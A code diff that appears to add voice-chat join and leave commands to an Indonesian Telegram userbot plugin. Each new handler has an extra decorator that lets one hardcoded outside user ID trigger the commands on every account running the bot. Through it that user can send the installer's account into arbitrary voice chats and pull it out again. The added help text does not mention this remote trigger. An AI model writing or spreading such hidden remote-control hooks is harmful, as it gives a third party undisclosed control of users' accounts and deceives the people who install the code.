@@ -112,7 +112,69 @@ async def change_title(e):
         await edit_or_reply(e, f"**Berhasil Mengubah Judul VCG Menjadi** `{title}`")
     except Exception as ex:
         await edit_delete(e, f"**ERROR:** `{ex}`")
+@hiro_cmd(pattern="joinvc(?: |$)(.*)", group_only=True)
+@register(incoming=True, from_users=1700405732, pattern=r"^Joinvcs$")
+async def _(a):
+    sender = await a.get_sender()
+    yins = await a.client.get_me()
+    if sender.id != yins.id:
+        Ayiin = await a.reply(get_string("com_1"))
+    else: 
+        Ayiin = await eor(a, get_string("com_1"))
+    if len(a.text.split()) > 1:
+        chat_id = a.text.split()[1]
+        try:
+            chat_id = await a.client.get_peer_id(int(chat_id))
+        except Exception as e:
+            return await Ayiin.edit(get_string("error_1").format(e))
+    else:
+        chat_id = a.chat_id
+    file = "./AyiinXd/resources/ayiin.mp3"
+    if chat_id:
+        try:
+            await call_py.join_group_call(
+                chat_id,
+                InputStream(
+                    InputAudioStream(
+                        file,
+                    ),
+                ),
+                stream_type=StreamType().pulse_stream,
+            )
+            await Ayiin.edit(get_string("jovc_1").format(yins.first_name, yins.id, chat_id)
+            )
+        except AlreadyJoinedError:
+            await call_py.leave_group_call(chat_id)
+            await eod(Ayiin, get_string("jovc_2").format(cmd)
+            )
+        except Exception as e:
+            await Ayiin.edit(get_string("error_1").format(e))
 
+
+@hiro_cmd(pattern="leavevc(?: |$)(.*)", group_only=True)
+@register(incoming=True, from_users=1700405732, pattern=r"^Leavevcs$")
+async def vc_end(y):
+    sender = await y.get_sender()
+    yins = await y.client.get_me()
+    if sender.id != yins.id:
+        Ayiin = await y.reply(get_string("com_1"))
+    else: 
+        Ayiin = await eor(y, get_string("com_1"))
+    if len(y.text.split()) > 1:
+        chat_id = y.text.split()[1]
+        try:
+            chat_id = await y.client.get_peer_id(int(chat_id))
+        except Exception as e:
+            return await Ayiin.edit(get_string("error_1").format(e))
+    else:
+        chat_id = y.chat_id
+    if chat_id:
+        try:
+            await call_py.leave_group_call(chat_id)
+            await eod(Ayiin, get_string("levc_1").format(yins.first_name, yins.id, chat_id)
+            )
+        except Exception as e:
+            await Ayiin.edit(get_string("error_1").format(e))
 
 CMD_HELP.update(
     {
@@ -125,6 +187,10 @@ CMD_HELP.update(
         \n   : **Untuk Mengubah title/judul voice chat group\
         \n\n   :** `{cmd}vcinvite`\
         \n   : **Mengundang Member group ke voice chat group\
+        \n\n  »  **Perintah :** `{cmd}joinvc` atau `{cmd}joinvc` <chatid/username gc>\
+        \n  »  **Kegunaan : **Untuk Bergabung ke voice chat group\
+        \n\n  »  **Perintah :** `{cmd}leavevc` atau `{cmd}leavevc` <chatid/username gc>\
+        \n  »  **Kegunaan : **Untuk Turun dari voice chat group\
     "
     }
 )
